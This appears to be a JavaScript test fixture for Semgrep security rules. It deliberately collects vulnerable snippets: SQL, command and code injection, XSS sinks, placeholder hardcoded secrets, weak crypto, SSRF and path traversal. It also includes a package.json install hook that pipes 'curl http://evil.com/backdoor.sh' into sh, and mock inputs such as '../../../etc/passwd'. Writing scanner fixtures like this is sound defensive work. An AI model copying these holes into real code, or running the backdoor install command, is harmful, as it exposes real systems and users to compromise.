/*
 * Purpose: Comprehensive test file for Semgrep Registry Rules
 * Author: Harsh Patil
 * Date: 2026-01-20
 * Modified By: N/A
 * 
 * This file intentionally contains vulnerabilities to test ALL registry rulesets:
 * - p/security-audit, p/owasp-top-ten, p/cwe-top-25, p/pci-dss
 * - p/javascript, p/typescript, p/react, p/nodejs, p/express
 * - p/sql-injection, p/xss, p/command-injection, p/secrets
 */

// ==========================================
// OWASP A01:2021 - Broken Access Control
// ==========================================

// Missing authorization checks
app.get('/admin/users', (req, res) => {
    const users = db.getAllUsers();
    res.json(users);
});

// Insecure Direct Object Reference (IDOR)
app.get('/api/documents/:id', (req, res) => {
    const doc = db.getDocument(req.params.id);
    res.json(doc);
});

// Path traversal
const filePath = req.query.file;
fs.readFile(`/uploads/${filePath}`, (err, data) => {
    res.send(data);
});

// ==========================================
// OWASP A02:2021 - Cryptographic Failures
// ==========================================

// Hardcoded secrets (p/secrets)
const API_KEY = "sk_live_1234567890abcdef";
const AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
const DB_PASSWORD = "MySecretPassword123!";
const STRIPE_KEY = "sk_test_51234567890";
const JWT_SECRET = "super-secret-jwt-key";

// Weak crypto algorithms
const crypto = require('crypto');
const hash = crypto.createHash('md5').update('password').digest('hex');
const sha1Hash = crypto.createHash('sha1').update(data);

// Insecure random
const sessionId = Math.random().toString(36);
const token = Date.now().toString();

// Weak encryption
crypto.createCipheriv('des', key, iv);
crypto.createCipheriv('aes-128-cbc', weakKey, iv);

// HTTP instead of HTTPS (p/insecure-transport)
axios.post('http://api.example.com/payment', {
    cardNumber: '4111111111111111',
    cvv: '123'
});

// ==========================================
// OWASP A03:2021 - Injection
// ==========================================

// SQL Injection (p/sql-injection)
const query = "SELECT * FROM users WHERE id = " + req.params.id;
db.query("DELETE FROM sessions WHERE token = '" + token + "'");
connection.execute(`INSERT INTO logs VALUES (${userInput})`);
pool.query("UPDATE users SET admin = 1 WHERE name = " + userName);

// NoSQL Injection
User.find({ $where: req.body.search });
db.collection.find({ username: { $ne: null }, password: { $regex: req.query.pass } });

// Command Injection (p/command-injection)
const { exec } = require('child_process');
exec(`ping ${req.query.host}`);
execSync("ls " + userDirectory);
spawn('sh', ['-c', userCommand]);

// Code Injection
eval(req.body.code);
new Function(userScript)();
setTimeout(req.query.callback, 1000);

// LDAP Injection
const ldapQuery = `(uid=${username})`;

// XPath Injection
const xpath = `/users/user[name='${userName}']`;

// ==========================================
// OWASP A03:2021 - XSS (p/xss)
// ==========================================

// DOM-based XSS
document.write("<h1>" + userName + "</h1>");
element.innerHTML = location.hash;
div.innerHTML = window.name;

// React XSS
function UserProfile({ data }) {
    return <div dangerouslySetInnerHTML={{ __html: data.bio }} />;
}

//  Reflected XSS
res.send(`<h1>Welcome ${req.query.name}</h1>`);
res.write('<script>alert("' + userInput + '")</script>');

// ==========================================
// OWASP A04:2021 - Insecure Design
// ==========================================

// Missing rate limiting
app.post('/api/login', async (req, res) => {
    const user = await authenticate(req.body);
    res.json(user);
});

// Weak password requirements
if (password.length >= 6) {
    createAccount(username, password);
}

// No account lockout
let loginAttempts = 0;
while (!authenticated) {
    tryLogin(user, pass);
}

// ==========================================
// OWASP A05:2021 - Security Misconfiguration
// ==========================================

// CORS wildcard
app.use(cors({ origin: '*', credentials: true }));
res.setHeader('Access-Control-Allow-Origin', '*');

// Debug mode enabled
app.set('env', 'development');
const DEBUG = true;

// Verbose error messages
app.use((err, req, res, next) => {
    res.status(500).json({
        error: err.message,
        stack: err.stack,
        details: err
    });
});

// Missing security headers
app.get('/', (req, res) => {
    res.send(htmlContent);
});

// ==========================================
// OWASP A06:2021 - Vulnerable Components
// ==========================================

// Outdated dependencies
const express = require('express'); // Assume old version
const lodash = require('lodash'); // Vulnerable version
const moment = require('moment'); // Unmaintained

// Known vulnerable packages
const serialize = require('node-serialize');
const execLib = require('exec');

// ==========================================
// OWASP A07:2021 - Authentication Failures
// ==========================================

// JWT without verification
const decoded = jwt.decode(authToken);
const payload = jwt.verify(token, { verify: false });

// Insecure session management
req.session.userId = user.id;
// No session regeneration after login

// Password in URL
window.location.href = `/login?username=${user}&password=${pass}`;

// Timing attack vulnerability
if (storedPassword === submittedPassword) {
    grantAccess();
}

// ==========================================
// OWASP A08:2021 - Data Integrity Failures
// ==========================================

// Insecure deserialization
const obj = serialize.unserialize(userInput);
const data = JSON.parse(untrustedData);

// Missing integrity checks
const script = document.createElement('script');
script.src = `https://cdn.example.com/lib.js`;
document.body.appendChild(script);

// ==========================================
// OWASP A09:2021 - Logging Failures
// ==========================================

// Logging sensitive data (PCI-DSS violation)
console.log('User logged in:', user, password);
logger.info('Payment processed', { cardNumber, cvv });
winston.log('debug', 'API Key:', apiKey);

// Insufficient logging
app.post('/transfer-money', (req, res) => {
    transferFunds(req.body.amount, req.body.to);
    res.json({ success: true });
});

// ==========================================
// OWASP A10:2021 - SSRF
// ==========================================

// Server-Side Request Forgery
const url = req.query.url;
axios.get(url);
fetch(userProvidedUrl);
request(externalUrl);

// ==========================================
// PCI-DSS VIOLATIONS (p/pci-dss)
// ==========================================

// Storing full PAN (Primary Account Number)
localStorage.setItem('cardNumber', '4111111111111111');
db.save({ card: fullCardNumber });

// Storing CVV (STRICTLY PROHIBITED)
database.insert({ cvv: cardCVV, cvc: securityCode });

// Displaying full PAN
displayText.textContent = creditCardNumber;
alert('Your card: ' + cardNum);

// Weak authentication
if (pin.length === 4) {
    authorizePayment();
}

// Logging cardholder data
fs.appendFileSync('transactions.log', `Card: ${card}, Amount: ${amount}`);

// ==========================================
// NODE.JS SPECIFIC (p/nodejs, p/express)
// ==========================================

// Prototype pollution
Object.prototype.polluted = 'yes';
const config = {};
config.__proto__.admin = true;

// ReDoS (Regular Expression DoS)
const emailRegex = /(.+)*@(.+)*/;
emailRegex.test(userEmail);

// Unvalidated redirect
res.redirect(req.query.next);
res.redirect(301, userUrl);

// Mass assignment
User.create(req.body);
user.update(req.body);

// Using `eval` in template
const template = `Hello ${eval(userName)}`;

// ==========================================
// REACT SPECIFIC (p/react)
// ==========================================

// Unsafe refs
class MyComponent extends React.Component {
    handleClick = () => {
        this.myRef.current.innerHTML = userInput;
    }
}

// setState with user input
this.setState({ data: req.query.data });

// Missing key prop
{ items.map(item => <div>{item.name}</div>) }

// ==========================================
// SUPPLY CHAIN (p/supply-chain, p/ci)
// ==========================================

// npm install from untrusted source
// package.json with git dependencies
{
    "dependencies": {
        "malicious-pkg": "git://github.com/attacker/malicious.git"
    }
}

// Running arbitrary code in package.json
{
    "scripts": {
        "install": "curl http://evil.com/backdoor.sh | sh"
    }
}

// ==========================================
// CWE TOP 25 COVERAGE
// ==========================================

// CWE-79: XSS (already covered)
// CWE-89: SQL Injection (already covered) 
// CWE-20: Improper Input Validation
app.post('/api/user', (req, res) => {
    db.insert(req.body);
});

// CWE-78: OS Command Injection (already covered)
// CWE-190: Integer Overflow
const result = Number.MAX_VALUE + 1000000;

// CWE-352: CSRF
app.post('/transfer', (req, res) => {
    // No CSRF token validation
    transfer(req.body.to, req.body.amount);
});

// CWE-22: Path Traversal (already covered)
// CWE-77: Command Injection (already covered)
// CWE-119: Buffer Overflow
Buffer.alloc(userSize);

// CWE-918: SSRF (already covered)
// CWE-862: Missing Authorization (already covered)

// ==========================================
// ADDITIONAL PATTERNS
// ==========================================

// DNS Rebinding
fetch(`http://${req.headers.host}/internal-api`);

// XXE (XML External Entity)
const xml = require('xml2js');
xml.parseString(userXML, {}, callback);

// ZIP Bomb
const zip = require('adm-zip');
zip.extractAllTo(uploadedZip, '/tmp');

// Memory exhaustion
const hugeArray = new Array(999999999);

// Regex DoS
const catastrophicRegex = /(a+)+b/;
catastrophicRegex.test(longString);

// WebSocket without auth
const ws = new WebSocket('ws://example.com');
ws.onmessage = (event) => eval(event.data);

// ==========================================
// FRAMEWORK SPECIFIC ISSUES
// ==========================================

// Express: Trust proxy without validation
app.set('trust proxy', true);

// Express: JSON pollution
app.use(express.json({ limit: '50mb' }));

// Next.js: Exposing API routes
export default function handler(req, res) {
    const data = getSecretData();
    res.json(data);
}

// ==========================================
// HELPER FUNCTIONS & MOCKS
// ==========================================

const db = {
    query: () => { },
    getAllUsers: () => [],
    getDocument: () => ({}),
    save: () => { },
    insert: () => { }
};

const app = {
    get: () => { },
    post: () => { },
    use: () => { },
    set: () => { }
};

const req = {
    params: { id: '1' },
    query: { file: '../../../etc/passwd', host: 'evil.com' },
    body: { search: '$ne', code: 'malicious' },
    headers: { host: 'example.com' }
};

const res = {
    json: () => { },
    send: () => { },
    write: () => { },
    redirect: () => { },
    setHeader: () => { },
    status: () => ({ json: () => { } })
};

function authenticate() { }
function createAccount() { }
function tryLogin() { }
function grantAccess() { }
function transferFunds() { }
function authorizePayment() { }
function transfer() { }
function getSecretData() { return {}; }
